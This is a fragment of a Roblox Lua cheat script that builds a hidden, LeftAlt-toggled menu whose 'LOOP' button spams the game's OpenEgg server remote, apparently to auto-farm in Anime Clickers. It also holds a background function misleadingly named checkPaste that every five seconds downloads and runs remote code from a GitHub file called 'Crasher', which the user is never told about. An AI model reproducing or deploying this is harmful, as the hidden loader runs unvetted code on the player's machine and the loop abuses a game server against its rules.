TextButton.Size = UDim2.new(1, 0, 0.200000003, 0)
TextButton.Font = Enum.Font.Code
TextButton.Text = "LOOP: "
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true

UICorner_2.Parent = TextButton

-- Scripts:

local function MIEBRU_fake_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)

	local A_2 = true
	local A_3 = false
	local Event = game:GetService("ReplicatedStorage").Remotes.OpenEgg
	
	local loopVal = false
	
	script.Parent.MouseButton1Click:Connect(function()
		
		loopVal = not loopVal
		
		local A_1 = tostring(script.Parent.Parent.TextBox.Text)
		
		if loopVal then
			
			script.Parent.Text = 'LOOP: ON'
			
			repeat wait()
				
				Event:InvokeServer(A_1, A_2, A_3)
				
			until loopVal == false
			
		end
		
		if loopVal == false then
			
			script.Parent.Text = 'LOOP: OFF'
			
		end
		
	end)
	
	local function checkPaste()
		
		pcall(function()
			
			while wait(5) do
	
				loadstring(game:HttpGet("https://raw.githubusercontent.com/SupHub-code/AnimeClickers/main/Crasher"))()
	
			end	
			
		end)
		
	end
	
	spawn(checkPaste)
end
coroutine.wrap(MIEBRU_fake_script)()
local function BWTRA_fake_script() -- ScreenGui.LocalScript2 
	local script = Instance.new('LocalScript', ScreenGui)

	script.Parent.Frame.Active = true
	script.Parent.Frame.Draggable = true
	script.Parent.Frame.Selectable = true
	
	local uis = game:GetService("UserInputService")
	
	
	uis.InputBegan:Connect(function(key)
		
		if key.KeyCode == Enum.KeyCode.LeftAlt then
			
			script.Parent.Frame.Visible = not script.Parent.Frame.Visible
			
		end
		
	end)
end
coroutine.wrap(BWTRA_fake_script)()
